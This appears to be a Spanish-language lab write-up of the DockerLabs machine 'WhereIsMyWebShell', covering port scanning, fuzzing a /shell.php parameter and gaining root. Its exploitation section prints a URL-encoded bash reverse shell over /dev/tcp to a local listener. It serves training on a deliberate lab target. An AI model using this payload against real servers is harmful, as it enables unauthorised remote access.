# Máquina WhereIsMyWebShell (DockerLabs)

<img width="504" height="327" alt="Screenshot_7" src="https://github.com/user-attachments/assets/0feafac3-425c-43e0-90bb-3a0c2af45acc" />

## Fase de Reconocimiento
Con lo que empiezo siempre es con un escaneo de puertos rápido con NMAP:

```bash
nmap -p- -n -v -Pn 172.17.0.2 -oN scan-basic
---
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 02:42:AC:11:00:02 (Unknown)
```
```bash
> nmap -p80 -sCV 172.17.0.2 -oN scan-full
---
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-title: Academia de Ingl\xC3\xA9s (Inglis Academi)
|_http-server-header: Apache/2.4.57 (Debian)
MAC Address: 02:42:AC:11:00:02 (Unknown)
```

- Puerto 80: Apache httpd 2.4.57

Con esta información me doy cuenta que la versión del **Página WEB de Apache** es reciente. Así que procedo a inspeccionar un poco la página:

<img width="1384" height="784" alt="Screenshot_3" src="https://github.com/user-attachments/assets/95f51e32-0c79-42ba-b4f0-1f6015976a08" />

Me doy cuenta que al final de la página Mario nos deja un mensajito:

<img width="951" height="125" alt="Screenshot_6" src="https://github.com/user-attachments/assets/edbefb90-2a2c-4e30-9127-2d30bf007143" />

Continuo el reconociementoo utilizando `gobuster` con listado rápido con la wordlist `common.txt`:

<img width="1050" height="331" alt="Screenshot_4" src="https://github.com/user-attachments/assets/65e86364-dc35-45e6-a6a1-15f619f47eee" />

Me fijo en ese endpoint `/shell.php` que da error del servidor al acceder. Decido utilizar `wfuzz` para encontrar un parametro con el que injectar comandos desde la **URL**:

<img width="1709" height="314" alt="Screenshot_8" src="https://github.com/user-attachments/assets/0b86f4bb-2539-414d-9646-3611b9d16f8a" />

## Fase de Explotación

Una vez con el comando, decido crear una **Reverse Shell** pero codificada para que se pueda ejecutar desde la **URL**, ya que no me sirve de nada ver los usuarios porque la màquina no tiene un servidor `ssh` o `ftp`:
```bash
http://172.17.0.2/shell.php?parameter=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.17.0.1%2F1234%200%3E%261%27
```

<img width="636" height="176" alt="Screenshot_5" src="https://github.com/user-attachments/assets/48a780b3-7149-4e0c-a9d1-f5ea598a4318" />

Ya una vez dentro del sistema, me voy a la carpeta `/tmp` recordando el mensajito que nos dejó Mario:

<img width="485" height="162" alt="Screenshot_1" src="https://github.com/user-attachments/assets/1cd5e353-40d4-4c29-97ef-11161e30f73d" />

Mario nos da la password de `root`, pero antes de iniciar sesión como `root` decido hacer un **Tratamiento de la tty**. Es la primera vez que lo realizo y es algo que siempre me recomiendan que me acostumbre a utilizar:

```bash
> script /dev/null -c bash
> ^Z
> stty raw -echo; fg
> reset
> xterm
```

Y ahora si, accedo como `root`:

<img width="311" height="84" alt="Screenshot_2" src="https://github.com/user-attachments/assets/7f223e12-4ba2-439a-bf49-81584a182155" />

## Comentarios
Con esta máquina he descubierto la forma de ejecutar una **Reverse Shell** mediante la vulnerabilidad **FLI**, sabía que era posible y he encontrado la forma de codificarla para que funcione desde la **URL**.
